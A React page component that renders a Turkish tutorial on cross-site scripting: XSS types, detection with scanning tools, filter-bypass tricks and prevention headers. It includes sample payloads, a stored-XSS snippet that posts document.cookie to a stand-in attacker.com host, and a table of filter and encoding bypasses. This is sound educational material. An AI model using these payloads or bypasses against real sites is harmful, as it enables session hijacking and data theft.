"use client"

import { motion } from "framer-motion"
import Link from "next/link"
import { ArrowLeft, ArrowRight, Globe } from "lucide-react"
import { CodeBlock } from "@/components/docs/code-block"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "xss-nedir", title: "XSS Nedir?", level: 2 },
  { id: "xss-turleri", title: "XSS Türleri", level: 2 },
  { id: "reflected-xss", title: "Reflected XSS", level: 3 },
  { id: "stored-xss", title: "Stored XSS", level: 3 },
  { id: "dom-xss", title: "DOM-based XSS", level: 3 },
  { id: "tespit-yontemleri", title: "Tespit Yöntemleri", level: 2 },
  { id: "bypass-teknikleri", title: "Bypass Teknikleri", level: 2 },
  { id: "onleme", title: "Önleme", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.5 },
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1,
    },
  },
}

export default function XSSPage() {
  return (
    <>
      <TableOfContents items={tocItems} />
      
      <motion.article
        initial="initial"
        animate="animate"
        variants={stagger}
        className="prose prose-invert max-w-none"
      >
        {/* Header */}
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
            <Globe className="w-4 h-4" />
            <span>Web Zafiyetleri</span>
          </div>
          
          <h1 id="xss-nedir" className="text-4xl font-bold text-foreground mb-4 scroll-mt-20">
            Cross-Site Scripting (XSS)
          </h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            XSS, web uygulamalarında en yaygın güvenlik açıklarından biridir. 
            Bu rehberde XSS türlerini, tespit yöntemlerini ve bypass tekniklerini öğreneceksiniz.
          </p>
        </motion.div>

        {/* Intro */}
        <motion.section variants={fadeIn}>
          <Callout type="info" title="Önemli">
            Bu rehberdeki tüm teknikler sadece eğitim amaçlıdır. 
            İzinsiz sistemlere saldırı yapmak yasadışıdır.
          </Callout>

          <p className="text-muted-foreground leading-relaxed mb-4">
            Cross-Site Scripting (XSS), saldırganların güvenilir web sitelerine zararlı 
            script enjekte etmesine olanak tanıyan bir güvenlik açığıdır. Kurban, bu 
            zararlı scripti çalıştırdığında, saldırgan kullanıcının oturumunu çalabilir, 
            hassas verilere erişebilir veya kullanıcı adına işlemler yapabilir.
          </p>
        </motion.section>

        {/* XSS Types */}
        <motion.section variants={fadeIn}>
          <h2 id="xss-turleri" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            XSS Türleri
          </h2>
          
          <p className="text-muted-foreground leading-relaxed mb-6">
            XSS saldırıları üç ana kategoriye ayrılır. Her birinin farklı özellikleri 
            ve sömürü yöntemleri vardır.
          </p>

          {/* Reflected XSS */}
          <h3 id="reflected-xss" className="text-xl font-semibold text-foreground mb-3 scroll-mt-20">
            1. Reflected XSS
          </h3>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Reflected XSS, zararlı scriptin URL parametreleri veya form verileri aracılığıyla 
            sunucuya gönderilip, yanıtta doğrudan yansıtılması durumunda oluşur.
          </p>

          <CodeBlock
            language="http"
            filename="Vulnerable Endpoint"
            code={`GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: vulnerable-site.com

# Sunucu yanıtı
<p>Arama sonuçları: <script>alert('XSS')</script></p>`}
          />

          <div className="not-prose my-6 p-4 rounded-lg bg-card border border-border/50">
            <h4 className="font-semibold text-foreground mb-2">Örnek Payload&apos;lar</h4>
            <div className="space-y-2 font-mono text-sm">
              <div className="p-2 bg-secondary/50 rounded text-muted-foreground overflow-x-auto">
                {"<script>alert(document.domain)</script>"}
              </div>
              <div className="p-2 bg-secondary/50 rounded text-muted-foreground overflow-x-auto">
                {"<img src=x onerror=alert('XSS')>"}
              </div>
              <div className="p-2 bg-secondary/50 rounded text-muted-foreground overflow-x-auto">
                {"<svg onload=alert('XSS')>"}
              </div>
            </div>
          </div>

          {/* Stored XSS */}
          <h3 id="stored-xss" className="text-xl font-semibold text-foreground mb-3 scroll-mt-20">
            2. Stored XSS
          </h3>
          <p className="text-muted-foreground leading-relaxed mb-4">
            Stored XSS, zararlı scriptin sunucuda kalıcı olarak depolandığı durumlarda 
            oluşur. Yorumlar, profil bilgileri veya mesajlar gibi alanlarda yaygındır.
          </p>

          <Callout type="warning" title="Yüksek Etki">
            Stored XSS, tüm ziyaretçileri etkilediği için genellikle daha yüksek 
            şiddet derecesine sahiptir ve daha yüksek ödüller alır.
          </Callout>

          <CodeBlock
            language="javascript"
            filename="stored-xss-example.js"
            showLineNumbers
            code={`// Yorum formu üzerinden XSS
const maliciousComment = \`
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: window.location.href
    })
  });
</script>
\`;

// Bu yorum veritabanına kaydedilir ve
// her kullanıcı sayfayı ziyaret ettiğinde çalışır`}
          />

          {/* DOM XSS */}
          <h3 id="dom-xss" className="text-xl font-semibold text-foreground mb-3 scroll-mt-20">
            3. DOM-based XSS
          </h3>
          <p className="text-muted-foreground leading-relaxed mb-4">
            DOM XSS, zararlı verinin istemci tarafı JavaScript tarafından işlenip 
            DOM&apos;a yazıldığı durumlarda oluşur. Sunucu tarafı filtreleri bu türü 
            tespit edemez.
          </p>

          <CodeBlock
            language="javascript"
            filename="dom-xss-example.js"
            showLineNumbers
            code={`// Savunmasız kod
const hash = window.location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// Saldırı URL'i
// https://vulnerable-site.com/#<img src=x onerror=alert('XSS')>

// Yaygın DOM XSS kaynakları (Sources)
// - document.URL
// - document.documentURI
// - location.href
// - location.search
// - location.hash
// - document.cookie
// - document.referrer

// Yaygın DOM XSS hedefleri (Sinks)
// - innerHTML
// - outerHTML
// - document.write()
// - eval()
// - setTimeout() / setInterval()`}
          />
        </motion.section>

        {/* Detection */}
        <motion.section variants={fadeIn}>
          <h2 id="tespit-yontemleri" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            Tespit Yöntemleri
          </h2>

          <p className="text-muted-foreground leading-relaxed mb-4">
            XSS açıklarını tespit etmek için sistematik bir yaklaşım gereklidir.
          </p>

          <div className="not-prose space-y-4 mb-6">
            {[
              {
                step: "01",
                title: "Giriş Noktalarını Belirle",
                desc: "URL parametreleri, form alanları, HTTP başlıkları ve cookie'leri inceleyin.",
              },
              {
                step: "02",
                title: "Yansıma Noktalarını Bul",
                desc: "Girdiğiniz verilerin sayfada nerede ve nasıl görüntülendiğini tespit edin.",
              },
              {
                step: "03",
                title: "Bağlamı Analiz Et",
                desc: "Verinin HTML, JavaScript, CSS veya URL bağlamında mı olduğunu belirleyin.",
              },
              {
                step: "04",
                title: "Payload Test Et",
                desc: "Bağlama uygun payload'larla test yapın ve filtreleri analiz edin.",
              },
            ].map((item) => (
              <div
                key={item.step}
                className="flex gap-4 p-4 rounded-lg border border-border/50 bg-card"
              >
                <div className="flex-shrink-0 w-10 h-10 rounded-lg bg-primary/10 text-primary flex items-center justify-center font-mono font-bold text-sm">
                  {item.step}
                </div>
                <div>
                  <h4 className="font-semibold text-foreground mb-1">{item.title}</h4>
                  <p className="text-sm text-muted-foreground">{item.desc}</p>
                </div>
              </div>
            ))}
          </div>

          <CodeBlock
            language="bash"
            filename="XSS Test Automation"
            code={`# Dalfox ile otomatik XSS tarama
dalfox url "https://target.com/search?q=FUZZ" \\
  --blind "https://your-server.com"

# Nuclei ile XSS template tarama
nuclei -u "https://target.com" -t xss/

# ParamSpider ile parametre keşfi
paramspider -d target.com | \\
  dalfox pipe --blind "https://your-server.com"`}
          />
        </motion.section>

        {/* Bypass Techniques */}
        <motion.section variants={fadeIn}>
          <h2 id="bypass-teknikleri" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            Bypass Teknikleri
          </h2>

          <p className="text-muted-foreground leading-relaxed mb-4">
            Modern uygulamalar XSS&apos;e karşı çeşitli korumalar kullanır. 
            İşte yaygın filtreleri atlatma teknikleri:
          </p>

          <div className="not-prose mb-6">
            <div className="rounded-lg border border-border/50 overflow-hidden">
              <table className="w-full text-sm">
                <thead className="bg-secondary/50">
                  <tr>
                    <th className="text-left p-3 text-foreground font-semibold">Filtre</th>
                    <th className="text-left p-3 text-foreground font-semibold">Bypass</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border/50">
                  {[
                    { filter: "<script> engeli", bypass: "<img src=x onerror=alert(1)>" },
                    { filter: "alert() engeli", bypass: "confirm(1) veya prompt(1)" },
                    { filter: "Küçük harf dönüşümü", bypass: "<ScRiPt>alert(1)</sCrIpT>" },
                    { filter: "Boşluk engeli", bypass: "<svg/onload=alert(1)>" },
                    { filter: "Tırnak engeli", bypass: "<img src=x onerror=alert`1`>" },
                    { filter: "Parantez engeli", bypass: "onerror=alert\\`1\\`" },
                  ].map((row, i) => (
                    <tr key={i} className="hover:bg-secondary/30">
                      <td className="p-3 text-muted-foreground">{row.filter}</td>
                      <td className="p-3 font-mono text-xs text-primary">{row.bypass}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>

          <Callout type="tip" title="İpucu">
            WAF bypass için encoding kombinasyonlarını deneyin: URL encoding, 
            HTML entities, Unicode encoding ve bunların karışımları.
          </Callout>

          <CodeBlock
            language="text"
            filename="Encoding Bypass Örnekleri"
            code={`# URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Double URL Encoding
%253Cscript%253Ealert(1)%253C/script%253E

# HTML Entities
&lt;script&gt;alert(1)&lt;/script&gt;

# Unicode
\\u003cscript\\u003ealert(1)\\u003c/script\\u003e

# Mixed Encoding
<scr%69pt>alert(1)</scr%69pt>`}
          />
        </motion.section>

        {/* Prevention */}
        <motion.section variants={fadeIn}>
          <h2 id="onleme" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            Önleme Yöntemleri
          </h2>

          <p className="text-muted-foreground leading-relaxed mb-4">
            XSS&apos;i önlemek için çok katmanlı bir güvenlik yaklaşımı gereklidir:
          </p>

          <div className="not-prose grid gap-4 md:grid-cols-2 mb-6">
            {[
              {
                title: "Output Encoding",
                desc: "Tüm kullanıcı girdilerini bağlama uygun şekilde encode edin.",
              },
              {
                title: "Content Security Policy",
                desc: "CSP header ile inline script çalıştırmayı engelleyin.",
              },
              {
                title: "HTTPOnly Cookie",
                desc: "Oturum cookie'lerini JavaScript'ten erişilemez yapın.",
              },
              {
                title: "Input Validation",
                desc: "Whitelist tabanlı input doğrulama uygulayın.",
              },
            ].map((item) => (
              <div key={item.title} className="p-4 rounded-lg bg-card border border-border/50">
                <h4 className="font-semibold text-foreground mb-1">{item.title}</h4>
                <p className="text-sm text-muted-foreground">{item.desc}</p>
              </div>
            ))}
          </div>

          <CodeBlock
            language="http"
            filename="Güvenli HTTP Headers"
            code={`Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict`}
          />
        </motion.section>

        {/* Navigation */}
        <motion.div variants={fadeIn} className="flex items-center justify-between pt-8 mt-8 border-t border-border/50 not-prose">
          <Link
            href="/docs"
            className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Giriş</span>
          </Link>
          <Link
            href="/docs/web/sql-injection"
            className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors"
          >
            <span>SQL Injection</span>
            <ArrowRight className="w-4 h-4" />
          </Link>
        </motion.div>
      </motion.article>
    </>
  )
}
